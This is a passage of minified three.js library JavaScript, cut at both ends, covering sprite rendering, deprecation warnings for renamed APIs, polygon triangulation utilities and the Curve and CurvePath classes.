THREE.Texture(H);I.needsUpdate=!0}w.useProgram(A);E.initAttributes();E.enableAttribute(u);E.enableAttribute(v);E.disableUnusedAttributes();\nE.disable(w.CULL_FACE);E.enable(w.BLEND);w.bindBuffer(w.ARRAY_BUFFER,z);w.vertexAttribPointer(u,2,w.FLOAT,!1,16,0);w.vertexAttribPointer(v,2,w.FLOAT,!1,16,8);w.bindBuffer(w.ELEMENT_ARRAY_BUFFER,y);w.uniformMatrix4fv(n,!1,M.projectionMatrix.elements);E.activeTexture(w.TEXTURE0);w.uniform1i(h,0);L=H=0;(O=P.fog)?(w.uniform3f(s,O.color.r,O.color.g,O.color.b),O instanceof THREE.Fog?(w.uniform1f(q,O.near),w.uniform1f(r,O.far),w.uniform1i(p,1),L=H=1):O instanceof THREE.FogExp2&&(w.uniform1f(m,O.density),\nw.uniform1i(p,2),L=H=2)):(w.uniform1i(p,0),L=H=0);for(var O=0,N=b.length;O<N;O++){var Q=b[O];Q.modelViewMatrix.multiplyMatrices(M.matrixWorldInverse,Q.matrixWorld);Q.z=-Q.modelViewMatrix.elements[14]}b.sort(C);for(var J=[],O=0,N=b.length;O<N;O++){var Q=b[O],D=Q.material;w.uniform1f(t,D.alphaTest);w.uniformMatrix4fv(l,!1,Q.modelViewMatrix.elements);Q.matrixWorld.decompose(B,F,K);J[0]=K.x;J[1]=K.y;Q=0;P.fog&&D.fog&&(Q=L);H!==Q&&(w.uniform1i(p,Q),H=Q);null!==D.map?(w.uniform2f(c,D.map.offset.x,D.map.offset.y),\nw.uniform2f(d,D.map.repeat.x,D.map.repeat.y)):(w.uniform2f(c,0,0),w.uniform2f(d,1,1));w.uniform1f(k,D.opacity);w.uniform3f(g,D.color.r,D.color.g,D.color.b);w.uniform1f(e,D.rotation);w.uniform2fv(f,J);E.setBlending(D.blending,D.blendEquation,D.blendSrc,D.blendDst);E.setDepthTest(D.depthTest);E.setDepthWrite(D.depthWrite);D.map?a.setTexture2D(D.map,0):a.setTexture2D(I,0);w.drawElements(w.TRIANGLES,6,w.UNSIGNED_SHORT,0)}E.enable(w.CULL_FACE);a.resetGLState()}}};\nObject.assign(THREE,{Face4:function(a,b,c,d,e,f,g){console.warn(\"THREE.Face4 has been removed. A THREE.Face3 will be created instead.\");return new THREE.Face3(a,b,c,e,f,g)},LineStrip:0,LinePieces:1,MeshFaceMaterial:THREE.MultiMaterial,PointCloud:function(a,b){console.warn(\"THREE.PointCloud has been renamed to THREE.Points.\");return new THREE.Points(a,b)},Particle:THREE.Sprite,ParticleSystem:function(a,b){console.warn(\"THREE.ParticleSystem has been renamed to THREE.Points.\");return new THREE.Points(a,\nb)},PointCloudMaterial:function(a){console.warn(\"THREE.PointCloudMaterial has been renamed to THREE.PointsMaterial.\");return new THREE.PointsMaterial(a)},ParticleBasicMaterial:function(a){console.warn(\"THREE.ParticleBasicMaterial has been renamed to THREE.PointsMaterial.\");return new THREE.PointsMaterial(a)},ParticleSystemMaterial:function(a){console.warn(\"THREE.ParticleSystemMaterial has been renamed to THREE.PointsMaterial.\");return new THREE.PointsMaterial(a)},Vertex:function(a,b,c){console.warn(\"THREE.Vertex has been removed. Use THREE.Vector3 instead.\");\nreturn new THREE.Vector3(a,b,c)}});Object.assign(THREE.Box2.prototype,{empty:function(){console.warn(\"THREE.Box2: .empty() has been renamed to .isEmpty().\");return this.isEmpty()},isIntersectionBox:function(a){console.warn(\"THREE.Box2: .isIntersectionBox() has been renamed to .intersectsBox().\");return this.intersectsBox(a)}});\nObject.assign(THREE.Box3.prototype,{empty:function(){console.warn(\"THREE.Box3: .empty() has been renamed to .isEmpty().\");return this.isEmpty()},isIntersectionBox:function(a){console.warn(\"THREE.Box3: .isIntersectionBox() has been renamed to .intersectsBox().\");return this.intersectsBox(a)},isIntersectionSphere:function(a){console.warn(\"THREE.Box3: .isIntersectionSphere() has been renamed to .intersectsSphere().\");return this.intersectsSphere(a)}});\nObject.assign(THREE.Matrix3.prototype,{multiplyVector3:function(a){console.warn(\"THREE.Matrix3: .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead.\");return a.applyMatrix3(this)},multiplyVector3Array:function(a){console.warn(\"THREE.Matrix3: .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead.\");return this.applyToVector3Array(a)}});\nObject.assign(THREE.Matrix4.prototype,{extractPosition:function(a){console.warn(\"THREE.Matrix4: .extractPosition() has been renamed to .copyPosition().\");return this.copyPosition(a)},setRotationFromQuaternion:function(a){console.warn(\"THREE.Matrix4: .setRotationFromQuaternion() has been renamed to .makeRotationFromQuaternion().\");return this.makeRotationFromQuaternion(a)},multiplyVector3:function(a){console.warn(\"THREE.Matrix4: .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) or vector.applyProjection( matrix ) instead.\");\nreturn a.applyProjection(this)},multiplyVector4:function(a){console.warn(\"THREE.Matrix4: .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead.\");return a.applyMatrix4(this)},multiplyVector3Array:function(a){console.warn(\"THREE.Matrix4: .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead.\");return this.applyToVector3Array(a)},rotateAxis:function(a){console.warn(\"THREE.Matrix4: .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead.\");\na.transformDirection(this)},crossVector:function(a){console.warn(\"THREE.Matrix4: .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead.\");return a.applyMatrix4(this)},translate:function(a){console.error(\"THREE.Matrix4: .translate() has been removed.\")},rotateX:function(a){console.error(\"THREE.Matrix4: .rotateX() has been removed.\")},rotateY:function(a){console.error(\"THREE.Matrix4: .rotateY() has been removed.\")},rotateZ:function(a){console.error(\"THREE.Matrix4: .rotateZ() has been removed.\")},\nrotateByAxis:function(a,b){console.error(\"THREE.Matrix4: .rotateByAxis() has been removed.\")}});Object.assign(THREE.Plane.prototype,{isIntersectionLine:function(a){console.warn(\"THREE.Plane: .isIntersectionLine() has been renamed to .intersectsLine().\");return this.intersectsLine(a)}});Object.assign(THREE.Quaternion.prototype,{multiplyVector3:function(a){console.warn(\"THREE.Quaternion: .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead.\");return a.applyQuaternion(this)}});\nObject.assign(THREE.Ray.prototype,{isIntersectionBox:function(a){console.warn(\"THREE.Ray: .isIntersectionBox() has been renamed to .intersectsBox().\");return this.intersectsBox(a)},isIntersectionPlane:function(a){console.warn(\"THREE.Ray: .isIntersectionPlane() has been renamed to .intersectsPlane().\");return this.intersectsPlane(a)},isIntersectionSphere:function(a){console.warn(\"THREE.Ray: .isIntersectionSphere() has been renamed to .intersectsSphere().\");return this.intersectsSphere(a)}});\nObject.assign(THREE.Vector3.prototype,{setEulerFromRotationMatrix:function(){console.error(\"THREE.Vector3: .setEulerFromRotationMatrix() has been removed. Use Euler.setFromRotationMatrix() instead.\")},setEulerFromQuaternion:function(){console.error(\"THREE.Vector3: .setEulerFromQuaternion() has been removed. Use Euler.setFromQuaternion() instead.\")},getPositionFromMatrix:function(a){console.warn(\"THREE.Vector3: .getPositionFromMatrix() has been renamed to .setFromMatrixPosition().\");return this.setFromMatrixPosition(a)},\ngetScaleFromMatrix:function(a){console.warn(\"THREE.Vector3: .getScaleFromMatrix() has been renamed to .setFromMatrixScale().\");return this.setFromMatrixScale(a)},getColumnFromMatrix:function(a,b){console.warn(\"THREE.Vector3: .getColumnFromMatrix() has been renamed to .setFromMatrixColumn().\");return this.setFromMatrixColumn(b,a)}});\nObject.assign(THREE.Object3D.prototype,{getChildByName:function(a){console.warn(\"THREE.Object3D: .getChildByName() has been renamed to .getObjectByName().\");return this.getObjectByName(a)},renderDepth:function(a){console.warn(\"THREE.Object3D: .renderDepth has been removed. Use .renderOrder, instead.\")},translate:function(a,b){console.warn(\"THREE.Object3D: .translate() has been removed. Use .translateOnAxis( axis, distance ) instead.\");return this.translateOnAxis(b,a)}});\nObject.defineProperties(THREE.Object3D.prototype,{eulerOrder:{get:function(){console.warn(\"THREE.Object3D: .eulerOrder is now .rotation.order.\");return this.rotation.order},set:function(a){console.warn(\"THREE.Object3D: .eulerOrder is now .rotation.order.\");this.rotation.order=a}},useQuaternion:{get:function(){console.warn(\"THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.\")},set:function(a){console.warn(\"THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.\")}}});\nObject.defineProperties(THREE.LOD.prototype,{objects:{get:function(){console.warn(\"THREE.LOD: .objects has been renamed to .levels.\");return this.levels}}});THREE.PerspectiveCamera.prototype.setLens=function(a,b){console.warn(\"THREE.PerspectiveCamera.setLens is deprecated. Use .setFocalLength and .filmGauge for a photographic setup.\");void 0!==b&&(this.filmGauge=b);this.setFocalLength(a)};\nObject.defineProperties(THREE.Light.prototype,{onlyShadow:{set:function(a){console.warn(\"THREE.Light: .onlyShadow has been removed.\")}},shadowCameraFov:{set:function(a){console.warn(\"THREE.Light: .shadowCameraFov is now .shadow.camera.fov.\");this.shadow.camera.fov=a}},shadowCameraLeft:{set:function(a){console.warn(\"THREE.Light: .shadowCameraLeft is now .shadow.camera.left.\");this.shadow.camera.left=a}},shadowCameraRight:{set:function(a){console.warn(\"THREE.Light: .shadowCameraRight is now .shadow.camera.right.\");\nthis.shadow.camera.right=a}},shadowCameraTop:{set:function(a){console.warn(\"THREE.Light: .shadowCameraTop is now .shadow.camera.top.\");this.shadow.camera.top=a}},shadowCameraBottom:{set:function(a){console.warn(\"THREE.Light: .shadowCameraBottom is now .shadow.camera.bottom.\");this.shadow.camera.bottom=a}},shadowCameraNear:{set:function(a){console.warn(\"THREE.Light: .shadowCameraNear is now .shadow.camera.near.\");this.shadow.camera.near=a}},shadowCameraFar:{set:function(a){console.warn(\"THREE.Light: .shadowCameraFar is now .shadow.camera.far.\");\nthis.shadow.camera.far=a}},shadowCameraVisible:{set:function(a){console.warn(\"THREE.Light: .shadowCameraVisible has been removed. Use new THREE.CameraHelper( light.shadow.camera ) instead.\")}},shadowBias:{set:function(a){console.warn(\"THREE.Light: .shadowBias is now .shadow.bias.\");this.shadow.bias=a}},shadowDarkness:{set:function(a){console.warn(\"THREE.Light: .shadowDarkness has been removed.\")}},shadowMapWidth:{set:function(a){console.warn(\"THREE.Light: .shadowMapWidth is now .shadow.mapSize.width.\");\nthis.shadow.mapSize.width=a}},shadowMapHeight:{set:function(a){console.warn(\"THREE.Light: .shadowMapHeight is now .shadow.mapSize.height.\");this.shadow.mapSize.height=a}}});Object.defineProperties(THREE.BufferAttribute.prototype,{length:{get:function(){console.warn(\"THREE.BufferAttribute: .length has been deprecated. Please use .count.\");return this.array.length}}});\nObject.assign(THREE.BufferGeometry.prototype,{addIndex:function(a){console.warn(\"THREE.BufferGeometry: .addIndex() has been renamed to .setIndex().\");this.setIndex(a)},addDrawCall:function(a,b,c){void 0!==c&&console.warn(\"THREE.BufferGeometry: .addDrawCall() no longer supports indexOffset.\");console.warn(\"THREE.BufferGeometry: .addDrawCall() is now .addGroup().\");this.addGroup(a,b)},clearDrawCalls:function(){console.warn(\"THREE.BufferGeometry: .clearDrawCalls() is now .clearGroups().\");this.clearGroups()},\ncomputeTangents:function(){console.warn(\"THREE.BufferGeometry: .computeTangents() has been removed.\")},computeOffsets:function(){console.warn(\"THREE.BufferGeometry: .computeOffsets() has been removed.\")}});Object.defineProperties(THREE.BufferGeometry.prototype,{drawcalls:{get:function(){console.error(\"THREE.BufferGeometry: .drawcalls has been renamed to .groups.\");return this.groups}},offsets:{get:function(){console.warn(\"THREE.BufferGeometry: .offsets has been renamed to .groups.\");return this.groups}}});\nObject.defineProperties(THREE.Material.prototype,{wrapAround:{get:function(){console.warn(\"THREE.\"+this.type+\": .wrapAround has been removed.\")},set:function(a){console.warn(\"THREE.\"+this.type+\": .wrapAround has been removed.\")}},wrapRGB:{get:function(){console.warn(\"THREE.\"+this.type+\": .wrapRGB has been removed.\");return new THREE.Color}}});\nObject.defineProperties(THREE.MeshPhongMaterial.prototype,{metal:{get:function(){console.warn(\"THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead.\");return!1},set:function(a){console.warn(\"THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead\")}}});\nObject.defineProperties(THREE.ShaderMaterial.prototype,{derivatives:{get:function(){console.warn(\"THREE.ShaderMaterial: .derivatives has been moved to .extensions.derivatives.\");return this.extensions.derivatives},set:function(a){console.warn(\"THREE. ShaderMaterial: .derivatives has been moved to .extensions.derivatives.\");this.extensions.derivatives=a}}});\nTHREE.EventDispatcher.prototype=Object.assign(Object.create({constructor:THREE.EventDispatcher,apply:function(a){console.warn(\"THREE.EventDispatcher: .apply is deprecated, just inherit or Object.assign the prototype to mix-in.\");Object.assign(a,this)}}),THREE.EventDispatcher.prototype);\nObject.assign(THREE.WebGLRenderer.prototype,{supportsFloatTextures:function(){console.warn(\"THREE.WebGLRenderer: .supportsFloatTextures() is now .extensions.get( 'OES_texture_float' ).\");return this.extensions.get(\"OES_texture_float\")},supportsHalfFloatTextures:function(){console.warn(\"THREE.WebGLRenderer: .supportsHalfFloatTextures() is now .extensions.get( 'OES_texture_half_float' ).\");return this.extensions.get(\"OES_texture_half_float\")},supportsStandardDerivatives:function(){console.warn(\"THREE.WebGLRenderer: .supportsStandardDerivatives() is now .extensions.get( 'OES_standard_derivatives' ).\");\nreturn this.extensions.get(\"OES_standard_derivatives\")},supportsCompressedTextureS3TC:function(){console.warn(\"THREE.WebGLRenderer: .supportsCompressedTextureS3TC() is now .extensions.get( 'WEBGL_compressed_texture_s3tc' ).\");return this.extensions.get(\"WEBGL_compressed_texture_s3tc\")},supportsCompressedTexturePVRTC:function(){console.warn(\"THREE.WebGLRenderer: .supportsCompressedTexturePVRTC() is now .extensions.get( 'WEBGL_compressed_texture_pvrtc' ).\");return this.extensions.get(\"WEBGL_compressed_texture_pvrtc\")},\nsupportsBlendMinMax:function(){console.warn(\"THREE.WebGLRenderer: .supportsBlendMinMax() is now .extensions.get( 'EXT_blend_minmax' ).\");return this.extensions.get(\"EXT_blend_minmax\")},supportsVertexTextures:function(){return this.capabilities.vertexTextures},supportsInstancedArrays:function(){console.warn(\"THREE.WebGLRenderer: .supportsInstancedArrays() is now .extensions.get( 'ANGLE_instanced_arrays' ).\");return this.extensions.get(\"ANGLE_instanced_arrays\")},enableScissorTest:function(a){console.warn(\"THREE.WebGLRenderer: .enableScissorTest() is now .setScissorTest().\");\nthis.setScissorTest(a)},initMaterial:function(){console.warn(\"THREE.WebGLRenderer: .initMaterial() has been removed.\")},addPrePlugin:function(){console.warn(\"THREE.WebGLRenderer: .addPrePlugin() has been removed.\")},addPostPlugin:function(){console.warn(\"THREE.WebGLRenderer: .addPostPlugin() has been removed.\")},updateShadowMap:function(){console.warn(\"THREE.WebGLRenderer: .updateShadowMap() has been removed.\")}});\nObject.defineProperties(THREE.WebGLRenderer.prototype,{shadowMapEnabled:{get:function(){return this.shadowMap.enabled},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapEnabled is now .shadowMap.enabled.\");this.shadowMap.enabled=a}},shadowMapType:{get:function(){return this.shadowMap.type},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapType is now .shadowMap.type.\");this.shadowMap.type=a}},shadowMapCullFace:{get:function(){return this.shadowMap.cullFace},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapCullFace is now .shadowMap.cullFace.\");\nthis.shadowMap.cullFace=a}}});Object.defineProperties(THREE.WebGLShadowMap.prototype,{cullFace:{get:function(){return this.renderReverseSided?THREE.CullFaceFront:THREE.CullFaceBack},set:function(a){a=a!==THREE.CullFaceBack;console.warn(\"WebGLRenderer: .shadowMap.cullFace is deprecated. Set .shadowMap.renderReverseSided to \"+a+\".\");this.renderReverseSided=a}}});\nObject.defineProperties(THREE.WebGLRenderTarget.prototype,{wrapS:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS.\");return this.texture.wrapS},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS.\");this.texture.wrapS=a}},wrapT:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT.\");return this.texture.wrapT},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT.\");this.texture.wrapT=\na}},magFilter:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter.\");return this.texture.magFilter},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter.\");this.texture.magFilter=a}},minFilter:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter.\");return this.texture.minFilter},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter.\");this.texture.minFilter=\na}},anisotropy:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy.\");return this.texture.anisotropy},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy.\");this.texture.anisotropy=a}},offset:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .offset is now .texture.offset.\");return this.texture.offset},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .offset is now .texture.offset.\");this.texture.offset=\na}},repeat:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .repeat is now .texture.repeat.\");return this.texture.repeat},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .repeat is now .texture.repeat.\");this.texture.repeat=a}},format:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .format is now .texture.format.\");return this.texture.format},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .format is now .texture.format.\");this.texture.format=a}},type:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .type is now .texture.type.\");\nreturn this.texture.type},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .type is now .texture.type.\");this.texture.type=a}},generateMipmaps:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps.\");return this.texture.generateMipmaps},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps.\");this.texture.generateMipmaps=a}}});\nObject.assign(THREE.Audio.prototype,{load:function(a){console.warn(\"THREE.Audio: .load has been deprecated. Please use THREE.AudioLoader.\");var b=this;(new THREE.AudioLoader).load(a,function(a){b.setBuffer(a)});return this}});Object.assign(THREE.AudioAnalyser.prototype,{getData:function(a){console.warn(\"THREE.AudioAnalyser: .getData() is now .getFrequencyData().\");return this.getFrequencyData()}});\nTHREE.GeometryUtils={merge:function(a,b,c){console.warn(\"THREE.GeometryUtils: .merge() has been moved to Geometry. Use geometry.merge( geometry2, matrix, materialIndexOffset ) instead.\");var d;b instanceof THREE.Mesh&&(b.matrixAutoUpdate&&b.updateMatrix(),d=b.matrix,b=b.geometry);a.merge(b,d,c)},center:function(a){console.warn(\"THREE.GeometryUtils: .center() has been moved to Geometry. Use geometry.center() instead.\");return a.center()}};\nTHREE.ImageUtils={crossOrigin:void 0,loadTexture:function(a,b,c,d){console.warn(\"THREE.ImageUtils.loadTexture has been deprecated. Use THREE.TextureLoader() instead.\");var e=new THREE.TextureLoader;e.setCrossOrigin(this.crossOrigin);a=e.load(a,c,void 0,d);b&&(a.mapping=b);return a},loadTextureCube:function(a,b,c,d){console.warn(\"THREE.ImageUtils.loadTextureCube has been deprecated. Use THREE.CubeTextureLoader() instead.\");var e=new THREE.CubeTextureLoader;e.setCrossOrigin(this.crossOrigin);a=e.load(a,\nc,void 0,d);b&&(a.mapping=b);return a},loadCompressedTexture:function(){console.error(\"THREE.ImageUtils.loadCompressedTexture has been removed. Use THREE.DDSLoader instead.\")},loadCompressedTextureCube:function(){console.error(\"THREE.ImageUtils.loadCompressedTextureCube has been removed. Use THREE.DDSLoader instead.\")}};\nTHREE.Projector=function(){console.error(\"THREE.Projector has been moved to /examples/js/renderers/Projector.js.\");this.projectVector=function(a,b){console.warn(\"THREE.Projector: .projectVector() is now vector.project().\");a.project(b)};this.unprojectVector=function(a,b){console.warn(\"THREE.Projector: .unprojectVector() is now vector.unproject().\");a.unproject(b)};this.pickingRay=function(a,b){console.error(\"THREE.Projector: .pickingRay() is now raycaster.setFromCamera().\")}};\nTHREE.CanvasRenderer=function(){console.error(\"THREE.CanvasRenderer has been moved to /examples/js/renderers/CanvasRenderer.js\");this.domElement=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");this.clear=function(){};this.render=function(){};this.setClearColor=function(){};this.setSize=function(){}};\nTHREE.CurveUtils={tangentQuadraticBezier:function(a,b,c,d){return 2*(1-a)*(c-b)+2*a*(d-c)},tangentCubicBezier:function(a,b,c,d,e){return-3*b*(1-a)*(1-a)+3*c*(1-a)*(1-a)-6*a*c*(1-a)+6*a*d*(1-a)-3*a*a*d+3*a*a*e},tangentSpline:function(a,b,c,d,e){return 6*a*a-6*a+(3*a*a-4*a+1)+(-6*a*a+6*a)+(3*a*a-2*a)},interpolate:function(a,b,c,d,e){a=.5*(c-a);d=.5*(d-b);var f=e*e;return(2*b-2*c+a+d)*e*f+(-3*b+3*c-2*a-d)*f+a*e+b}};\nTHREE.SceneUtils={createMultiMaterialObject:function(a,b){for(var c=new THREE.Group,d=0,e=b.length;d<e;d++)c.add(new THREE.Mesh(a,b[d]));return c},detach:function(a,b,c){a.applyMatrix(b.matrixWorld);b.remove(a);c.add(a)},attach:function(a,b,c){var d=new THREE.Matrix4;d.getInverse(c.matrixWorld);a.applyMatrix(d);b.remove(a);c.add(a)}};\nTHREE.ShapeUtils={area:function(a){for(var b=a.length,c=0,d=b-1,e=0;e<b;d=e++)c+=a[d].x*a[e].y-a[e].x*a[d].y;return.5*c},triangulate:function(){return function(a,b){var c=a.length;if(3>c)return null;var d=[],e=[],f=[],g,h,k;if(0<THREE.ShapeUtils.area(a))for(h=0;h<c;h++)e[h]=h;else for(h=0;h<c;h++)e[h]=c-1-h;var l=2*c;for(h=c-1;2<c;){if(0>=l--){console.warn(\"THREE.ShapeUtils: Unable to triangulate polygon! in triangulate()\");break}g=h;c<=g&&(g=0);h=g+1;c<=h&&(h=0);k=h+1;c<=k&&(k=0);var n;a:{var p=\nn=void 0,m=void 0,q=void 0,r=void 0,s=void 0,t=void 0,u=void 0,v=void 0,p=a[e[g]].x,m=a[e[g]].y,q=a[e[h]].x,r=a[e[h]].y,s=a[e[k]].x,t=a[e[k]].y;if(Number.EPSILON>(q-p)*(t-m)-(r-m)*(s-p))n=!1;else{var C=void 0,w=void 0,E=void 0,z=void 0,y=void 0,A=void 0,I=void 0,B=void 0,F=void 0,K=void 0,F=B=I=v=u=void 0,C=s-q,w=t-r,E=p-s,z=m-t,y=q-p,A=r-m;for(n=0;n<c;n++)if(u=a[e[n]].x,v=a[e[n]].y,!(u===p&&v===m||u===q&&v===r||u===s&&v===t)&&(I=u-p,B=v-m,F=u-q,K=v-r,u-=s,v-=t,F=C*K-w*F,I=y*B-A*I,B=E*v-z*u,F>=-Number.EPSILON&&\nB>=-Number.EPSILON&&I>=-Number.EPSILON)){n=!1;break a}n=!0}}if(n){d.push([a[e[g]],a[e[h]],a[e[k]]]);f.push([e[g],e[h],e[k]]);g=h;for(k=h+1;k<c;g++,k++)e[g]=e[k];c--;l=2*c}}return b?f:d}}(),triangulateShape:function(a,b){function c(a,b,c){return a.x!==b.x?a.x<b.x?a.x<=c.x&&c.x<=b.x:b.x<=c.x&&c.x<=a.x:a.y<b.y?a.y<=c.y&&c.y<=b.y:b.y<=c.y&&c.y<=a.y}function d(a,b,d,e,f){var g=b.x-a.x,h=b.y-a.y,k=e.x-d.x,l=e.y-d.y,n=a.x-d.x,p=a.y-d.y,y=h*k-g*l,A=h*n-g*p;if(Math.abs(y)>Number.EPSILON){if(0<y){if(0>A||A>\ny)return[];k=l*n-k*p;if(0>k||k>y)return[]}else{if(0<A||A<y)return[];k=l*n-k*p;if(0<k||k<y)return[]}if(0===k)return!f||0!==A&&A!==y?[a]:[];if(k===y)return!f||0!==A&&A!==y?[b]:[];if(0===A)return[d];if(A===y)return[e];f=k/y;return[{x:a.x+f*g,y:a.y+f*h}]}if(0!==A||l*n!==k*p)return[];h=0===g&&0===h;k=0===k&&0===l;if(h&&k)return a.x!==d.x||a.y!==d.y?[]:[a];if(h)return c(d,e,a)?[a]:[];if(k)return c(a,b,d)?[d]:[];0!==g?(a.x<b.x?(g=a,k=a.x,h=b,a=b.x):(g=b,k=b.x,h=a,a=a.x),d.x<e.x?(b=d,y=d.x,l=e,d=e.x):(b=\ne,y=e.x,l=d,d=d.x)):(a.y<b.y?(g=a,k=a.y,h=b,a=b.y):(g=b,k=b.y,h=a,a=a.y),d.y<e.y?(b=d,y=d.y,l=e,d=e.y):(b=e,y=e.y,l=d,d=d.y));return k<=y?a<y?[]:a===y?f?[]:[b]:a<=d?[b,h]:[b,l]:k>d?[]:k===d?f?[]:[g]:a<=d?[g,h]:[g,l]}function e(a,b,c,d){var e=b.x-a.x,f=b.y-a.y;b=c.x-a.x;c=c.y-a.y;var g=d.x-a.x;d=d.y-a.y;a=e*c-f*b;e=e*d-f*g;return Math.abs(a)>Number.EPSILON?(b=g*c-d*b,0<a?0<=e&&0<=b:0<=e||0<=b):0<e}var f,g,h,k,l,n={};h=a.concat();f=0;for(g=b.length;f<g;f++)Array.prototype.push.apply(h,b[f]);f=0;for(g=\nh.length;f<g;f++)l=h[f].x+\":\"+h[f].y,void 0!==n[l]&&console.warn(\"THREE.Shape: Duplicate point\",l),n[l]=f;f=function(a,b){function c(a,b){var d=h.length-1,f=a-1;0>f&&(f=d);var g=a+1;g>d&&(g=0);d=e(h[a],h[f],h[g],k[b]);if(!d)return!1;d=k.length-1;f=b-1;0>f&&(f=d);g=b+1;g>d&&(g=0);return(d=e(k[b],k[f],k[g],h[a]))?!0:!1}function f(a,b){var c,e;for(c=0;c<h.length;c++)if(e=c+1,e%=h.length,e=d(a,b,h[c],h[e],!0),0<e.length)return!0;return!1}function g(a,c){var e,f,h,k;for(e=0;e<l.length;e++)for(f=b[l[e]],\nh=0;h<f.length;h++)if(k=h+1,k%=f.length,k=d(a,c,f[h],f[k],!0),0<k.length)return!0;return!1}var h=a.concat(),k,l=[],n,p,z,y,A,I=[],B,F,K,P=0;for(n=b.length;P<n;P++)l.push(P);B=0;for(var M=2*l.length;0<l.length;){M--;if(0>M){console.log(\"Infinite Loop! Holes left:\"+l.length+\", Probably Hole outside Shape!\");break}for(p=B;p<h.length;p++){z=h[p];n=-1;for(P=0;P<l.length;P++)if(y=l[P],A=z.x+\":\"+z.y+\":\"+y,void 0===I[A]){k=b[y];for(F=0;F<k.length;F++)if(y=k[F],c(p,F)&&!f(z,y)&&!g(z,y)){n=F;l.splice(P,1);\nB=h.slice(0,p+1);y=h.slice(p);F=k.slice(n);K=k.slice(0,n+1);h=B.concat(F).concat(K).concat(y);B=p;break}if(0<=n)break;I[A]=!0}if(0<=n)break}}return h}(a,b);var p=THREE.ShapeUtils.triangulate(f,!1);f=0;for(g=p.length;f<g;f++)for(k=p[f],h=0;3>h;h++)l=k[h].x+\":\"+k[h].y,l=n[l],void 0!==l&&(k[h]=l);return p.concat()},isClockWise:function(a){return 0>THREE.ShapeUtils.area(a)},b2:function(){return function(a,b,c,d){var e=1-a;return e*e*b+2*(1-a)*a*c+a*a*d}}(),b3:function(){return function(a,b,c,d,e){var f=\n1-a,g=1-a;return f*f*f*b+3*g*g*a*c+3*(1-a)*a*a*d+a*a*a*e}}()};THREE.Curve=function(){};\nTHREE.Curve.prototype={constructor:THREE.Curve,getPoint:function(a){console.warn(\"THREE.Curve: Warning, getPoint() not implemented!\");return null},getPointAt:function(a){a=this.getUtoTmapping(a);return this.getPoint(a)},getPoints:function(a){a||(a=5);var b,c=[];for(b=0;b<=a;b++)c.push(this.getPoint(b/a));return c},getSpacedPoints:function(a){a||(a=5);var b,c=[];for(b=0;b<=a;b++)c.push(this.getPointAt(b/a));return c},getLength:function(){var a=this.getLengths();return a[a.length-1]},getLengths:function(a){a||\n(a=this.__arcLengthDivisions?this.__arcLengthDivisions:200);if(this.cacheArcLengths&&this.cacheArcLengths.length===a+1&&!this.needsUpdate)return this.cacheArcLengths;this.needsUpdate=!1;var b=[],c,d=this.getPoint(0),e,f=0;b.push(0);for(e=1;e<=a;e++)c=this.getPoint(e/a),f+=c.distanceTo(d),b.push(f),d=c;return this.cacheArcLengths=b},updateArcLengths:function(){this.needsUpdate=!0;this.getLengths()},getUtoTmapping:function(a,b){var c=this.getLengths(),d=0,e=c.length,f;f=b?b:a*c[e-1];for(var g=0,h=e-\n1,k;g<=h;)if(d=Math.floor(g+(h-g)/2),k=c[d]-f,0>k)g=d+1;else if(0<k)h=d-1;else{h=d;break}d=h;if(c[d]===f)return d/(e-1);g=c[d];return c=(d+(f-g)/(c[d+1]-g))/(e-1)},getTangent:function(a){var b=a-1E-4;a+=1E-4;0>b&&(b=0);1<a&&(a=1);b=this.getPoint(b);return this.getPoint(a).clone().sub(b).normalize()},getTangentAt:function(a){a=this.getUtoTmapping(a);return this.getTangent(a)}};\nTHREE.Curve.create=function(a,b){a.prototype=Object.create(THREE.Curve.prototype);a.prototype.constructor=a;a.prototype.getPoint=b;return a};THREE.CurvePath=function(){this.curves=[];this.autoClose=!1};\nTHREE.CurvePath.prototype=Object.assign(Object.create(THREE.Curve.prototype),{constructor:THREE.CurvePath,add:function(a){this.curves.push(a)},closePath:function(){var a=this.curves[0].getPoint(0),b=this.curves[this.curves.length-1].getPoint(1);a.equals(b)||this.curves.push(new THREE.LineCurve(b,a))},getPoint:function(a){for(var 